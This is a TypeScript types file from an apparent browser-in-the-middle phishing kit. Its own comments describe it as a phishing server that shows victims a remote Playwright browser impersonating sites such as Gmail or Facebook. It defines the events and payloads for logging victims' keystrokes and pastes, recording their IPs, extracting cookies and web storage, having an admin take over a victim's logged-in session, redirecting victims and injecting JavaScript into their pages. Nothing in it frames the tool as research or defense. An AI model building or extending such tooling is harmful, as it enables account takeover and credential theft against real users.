import type { Socket } from 'socket.io';

// ═══════════════════════════════════════════════════════════════════════════════
// Configuration Types
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Application configuration loaded from config.json.
 * Contains global settings for the phishing server.
 */
export interface Config {
  /** Default User-Agent string for all browser instances */
  default_user_agent: string;
  
  /** Secret key required for Socket.IO authentication (admin and victim) */
  socket_key: string;
  
  /** List of IP addresses allowed to access admin panel. Use ['*'] to allow all. */
  admin_ips: string[];
  
  /** Optional HTTP/HTTPS proxy server URL (e.g., 'http://proxy.example.com:8080') */
  proxy: string | null;
  
  /** Port number to bind the server to (default: 3000) */
  port?: number;
  
  /** Target name from targets.json to load for all victims */
  target: string;
}

/**
 * Target site configuration defining a phishing target.
 * Each target represents a specific website to impersonate.
 */
export interface Target {
  /** Display name for the target (shown in admin UI) */
  name: string;
  
  /** Full URL of the target site to load in the browser */
  url: string;
  
  /** Browser viewport width in pixels (target site's expected width) */
  width: number;
  
  /** Browser viewport height in pixels (target site's expected height) */
  height: number;
  
  /** Optional JavaScript code to inject into the page after load */
  inject_js?: string;
}

// ═══════════════════════════════════════════════════════════════════════════════
// Browser Instance State
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Represents a single Playwright browser instance with its associated state.
 * Each victim gets their own isolated browser context with persistent storage.
 */
export interface BrowserInstance {
  /** Unique identifier for this browser instance (UUID) */
  id: string;
  
  /** Socket.IO socket ID of the connected victim (null if unclaimed) */
  victimSocket: string | null;
  
  /** Socket.IO socket ID of the admin who has taken over (null if not taken over) */
  controllerSocket: string | null;
  
  /** Target site configuration (set when victim claims the instance) */
  target: Target | null;
  
  /**
   * Mutable frame callback function that receives JPEG frame buffers.
   * This callback is swapped during admin takeover to reroute frames.
   * Default: sends frames only to victim
   * During takeover: sends frames to both victim and admin
   */
  onFrame: (buf: Buffer) => void;
  
  /**
   * Horizontal scale factor for coordinate translation.
   * Computed as: target.width / victimViewportWidth
   * Used to translate victim's screen coordinates to Playwright viewport coordinates.
   */
  scaleX: number;
  
  /**
   * Vertical scale factor for coordinate translation.
   * Computed as: target.height / victimViewportHeight
   * Used to translate victim's screen coordinates to Playwright viewport coordinates.
   */
  scaleY: number;
  
  /** Underlying Playwright browser context (persistent, isolated storage) */
  context: import('playwright').BrowserContext;
  
  /** Active page within the browser context */
  page: import('playwright').Page;
  
  /**
   * Chrome DevTools Protocol session for screencast.
   * Used to capture frames via Page.startScreencast.
   * Null when screencast is not active.
   */
  cdpSession: import('playwright').CDPSession | null;
  
  /** Timestamp when the victim first connected (null if unclaimed) */
  connectedAt: Date | null;
  
  /** Whether this browser instance is currently claimed by a victim */
  claimed: boolean;
  
  /** Accumulated keystroke log for this session (formatted string) */
  keylog: string;
  
  /**
   * Screencast controller for cleanup.
   * Provides stop() method to cleanly terminate screencast and remove listeners.
   */
  screencastController: import('./screencast.js').ScreencastController | null;
  
  /**
   * Navigation logger listener reference for cleanup.
   * Logs all navigation events to session log file.
   */
  navigationLogger: ((frame: import('playwright').Frame) => void) | null;
  
  /**
   * Page metadata emitter listener reference for cleanup.
   * Emits page title and favicon to victim after navigation.
   */
  pageMetaEmitter: ((frame: import('playwright').Frame) => void) | null;
}

// ═══════════════════════════════════════════════════════════════════════════════
// Socket.IO Event Maps
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Events that clients (victim or admin) can send to the server.
 * These define the client → server communication protocol.
 */
export interface ClientToServerEvents {
  /** Victim: Announce self and request a browser session */
  new_phish: (data: NewPhishPayload) => void;
  
  /** Victim/Admin: Report mouse movement */
  mouse_move: (data: MousePayload) => void;
  
  /** Victim/Admin: Report mouse click */
  mouse_click: (data: MouseClickPayload) => void;
  
  /** Victim/Admin: Report mouse scroll */
  mouse_scroll: (data: MouseScrollPayload) => void;
  
  /** Victim/Admin: Report key press (down) */
  key_down: (data: KeyPayload) => void;
  
  /** Victim/Admin: Report key release (up) */
  key_up: (data: KeyPayload) => void;
  
  /** Victim/Admin: Report paste operation */
  paste: (data: PastePayload) => void;
  
  /** Admin: Request cookie extraction from active victim session */
  get_cookies: (data: { browserId: string }) => void;
  
  /** Admin: Request localStorage/sessionStorage extraction from active victim session */
  get_storage: (data: { browserId: string }) => void;
  
  /** Admin: Take control of a victim's browser (start receiving frames and sending input) */
  take_over_browser: (data: TakeoverPayload) => void;
  
  /** Admin: Return control to the victim (stop receiving frames) */
  give_back_control: () => void;
  
  /** Admin: Navigate victim's browser to a specific URL */
  navigate: (data: NavigatePayload) => void;
  
  /** Admin: Inject and execute JavaScript in victim's page */
  inject_js: (data: InjectPayload) => void;
}

/**
 * Events that the server can send to clients.
 * These define the server → client communication protocol.
 */
export interface ServerToClientEvents {
  /** JPEG frame buffer from screencast (sent to victim or admin) */
  frame: (data: Buffer) => void;
  
  /** Thumbnail JPEG for admin victim list (sent every Nth frame) */
  thumbnail: (data: ThumbnailPayload) => void;
  
  /** Cookie extraction result (sent to admin) */
  cookies: (data: CookiePayload) => void;
  
  /** localStorage/sessionStorage extraction result (sent to admin) */
  storage: (data: StoragePayload) => void;
  
  /** Notification that an admin has taken over control (sent to victim) */
  taken_over: () => void;
  
  /** Notification that control has been returned (sent to victim) */
  control_returned: () => void;
  
  /** Error message (sent to victim or admin) */
  error: (message: string) => void;
  
  /** Notification of new victim connection (sent to all admins) */
  new_victim: (data: VictimInfo) => void;
  
  /** Notification of victim disconnection (sent to all admins) */
  victim_disconnected: (data: { 
    browserId: string; 
    status: 'disconnected'; 
    keylog: string;
    cookies?: CookiePayload;
    storage?: StoragePayload;
  }) => void;
  
  /** List of currently active victims (sent to admin on connect) */
  victim_list: (data: VictimInfo[]) => void;
  
  /** Real-time keystroke entry from a victim (sent to all admins) */
  keylog: (data: KeylogPayload) => void;
  
  /** Page metadata (title + favicon) after navigation (sent to victim) */
  page_meta: (data: PageMetaPayload) => void;
  
  /** System-wide metrics update (sent to admin every 2s) */
  system_metrics: (data: SystemMetricsPayload) => void;
  
  /** Per-victim metrics update (sent to admin every 2s for each victim) */
  victim_metrics: (data: VictimMetricsPayload) => void;
}

/**
 * Per-socket server-side data storage.
 * Attached to each Socket.IO socket via socket.data.
 */
export interface SocketData {
  /** Whether this socket belongs to an admin (true) or victim (false) */
  isAdmin: boolean;
  
  /** Browser instance ID associated with this socket (set after claim or takeover) */
  browserId?: string;
}

// ═══════════════════════════════════════════════════════════════════════════════
// Event Payload Types
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Payload for new_phish event (victim requesting a browser session).
 */
export interface NewPhishPayload {
  /** Victim's viewport width in pixels */
  width: number;
  
  /** Victim's viewport height in pixels */
  height: number;
  
  /** Target key from targets.json (e.g., 'gmail', 'facebook') */
  target: string;
}

/**
 * Payload for mouse_move event.
 */
export interface MousePayload {
  /** X coordinate in victim's viewport space */
  x: number;
  
  /** Y coordinate in victim's viewport space */
  y: number;
}

/**
 * Payload for mouse_click event.
 */
export interface MouseClickPayload {
  /** X coordinate in victim's viewport space */
  x: number;
  
  /** Y coordinate in victim's viewport space */
  y: number;
  
  /** Mouse button that was clicked */
  button: 'left' | 'right' | 'middle';
}

/**
 * Payload for mouse_scroll event.
 */
export interface MouseScrollPayload {
  /** X coordinate where scroll occurred */
  x: number;
  
  /** Y coordinate where scroll occurred */
  y: number;
  
  /** Horizontal scroll delta (positive = right, negative = left) */
  deltaX: number;
  
  /** Vertical scroll delta (positive = down, negative = up) */
  deltaY: number;
}

/**
 * Payload for key_down and key_up events.
 */
export interface KeyPayload {
  /** Key value from KeyboardEvent.key (e.g., 'a', 'Enter', 'ArrowUp') */
  key: string;
  
  /** Key code from KeyboardEvent.code (e.g., 'KeyA', 'Enter', 'ArrowUp') */
  code: string;
}

/**
 * Payload for paste event.
 */
export interface PastePayload {
  /** Text content that was pasted */
  text: string;
}

/**
 * Payload for take_over_browser event.
 */
export interface TakeoverPayload {
  /** Browser instance ID to take over */
  browserId: string;
}

/**
 * Payload for navigate event.
 */
export interface NavigatePayload {
  /** URL to navigate to */
  url: string;
}

/**
 * Payload for inject_js event.
 */
export interface InjectPayload {
  /** JavaScript code to execute in the page context */
  js: string;
}

/**
 * Payload for thumbnail event (sent to admin).
 */
export interface ThumbnailPayload {
  /** Browser instance ID this thumbnail belongs to */
  browserId: string;
  
  /** JPEG image data as Buffer */
  data: Buffer;
}

/**
 * Payload for cookies event (sent to admin after extraction).
 */
export interface CookiePayload {
  /** Browser instance ID cookies were extracted from */
  browserId: string;
  
  /** Array of serialized cookies */
  cookies: SerializedCookie[];
}

/**
 * Payload for storage event (sent to admin after extraction).
 */
export interface StoragePayload {
  /** Browser instance ID storage was extracted from */
  browserId: string;
  
  /** localStorage key-value pairs */
  localStorage: Record<string, string>;
  
  /** sessionStorage key-value pairs */
  sessionStorage: Record<string, string>;
}

/**
 * Victim information sent to admin (in victim_list and new_victim events).
 */
export interface VictimInfo {
  /** Browser instance ID */
  browserId: string;
  
  /** Target site name */
  target: string;
  
  /** ISO 8601 timestamp when victim connected */
  connectedAt: string;
  
  /** Victim's IP address */
  ip: string;
  
  /** Accumulated keystroke log */
  keylog: string;
  
  /** Connection status: 'active' or 'disconnected' */
  status: 'active' | 'disconnected';
}

/**
 * Payload for keylog event (real-time keystroke entry).
 */
export interface KeylogPayload {
  /** Browser instance ID this keystroke belongs to */
  browserId: string;
  
  /** Formatted keystroke entry (e.g., 'a', '[Enter]', '[PASTE:text]') */
  entry: string;
}

/**
 * Payload for page_meta event (sent after navigation).
 */
export interface PageMetaPayload {
  /** Page title */
  title: string;
  
  /** Favicon URL (absolute) */
  favicon: string;
}

/**
 * System-wide metrics payload (sent to admin every 2s).
 */
export interface SystemMetricsPayload {
  /** Number of currently active victims */
  activeVictims: number;
  
  /** Maximum concurrent victims allowed */
  maxVictims: number;
  
  /** Server uptime in seconds */
  uptimeSeconds: number;
  
  /** Current memory usage in MB */
  memoryUsageMB: number;
  
  /** Total system memory in MB */
  memoryTotalMB: number;
  
  /** Memory usage as percentage (0-100) */
  memoryPercent: number;
  
  /** CPU usage as percentage (0-100) */
  cpuPercent: number;
  
  /** Total number of sessions started today */
  totalSessionsToday: number;
}

/**
 * Per-victim metrics payload (sent to admin every 2s for each victim).
 */
export interface VictimMetricsPayload {
  /** Browser instance ID */
  browserId: string;
  
  /** Session duration in seconds */
  sessionDurationSeconds: number;
  
  /** Current frames per second (calculated from last 30 frames) */
  currentFPS: number;
  
  /** Average frame latency in milliseconds */
  averageLatencyMs: number;
  
  /** Total number of keystrokes recorded */
  keystrokeCount: number;
  
  /** Memory usage for this browser context in MB */
  memoryUsageMB: number;
}

/**
 * Serialized cookie format (compatible with Playwright's cookie format).
 */
export interface SerializedCookie {
  /** Cookie name */
  name: string;
  
  /** Cookie value */
  value: string;
  
  /** Cookie domain (e.g., '.example.com') */
  domain: string;
  
  /** Cookie path (e.g., '/') */
  path: string;
  
  /** Expiration timestamp (Unix seconds, -1 for session cookies) */
  expires: number;
  
  /** Whether cookie is HTTP-only (not accessible via JavaScript) */
  httpOnly: boolean;
  
  /** Whether cookie requires HTTPS */
  secure: boolean;
  
  /** SameSite attribute for CSRF protection */
  sameSite: 'Strict' | 'Lax' | 'None' | 'no_restriction';
}

// ═══════════════════════════════════════════════════════════════════════════════
// Typed Socket Alias
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Type-safe Socket.IO socket with full event type information.
 * Use this type instead of raw Socket for type safety.
 */
export type AppSocket = Socket<
  ClientToServerEvents,
  ServerToClientEvents,
  Record<string, never>,
  SocketData
>;